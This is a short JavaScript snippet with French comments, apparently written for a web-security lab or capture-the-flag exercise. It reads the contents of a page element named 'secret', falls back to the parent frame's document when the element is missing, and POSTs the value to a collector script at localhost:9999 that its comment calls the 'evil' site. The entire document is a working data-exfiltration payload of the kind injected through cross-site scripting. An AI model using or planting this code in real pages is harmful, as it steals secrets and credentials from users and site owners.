const secretElement = document.getElementById('secret');
let secret;

if (secretElement) {
    secret = secretElement.innerText; // Récupérer le secret si présent
} else {
    secret = window.parent.document.getElementById('secret').innerText; // Essayer d’accéder au parent
}

// Envoie du secret vers le site evil
fetch("http://localhost:9999/collect.php", {
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    body: JSON.stringify({ secret: secret })
});
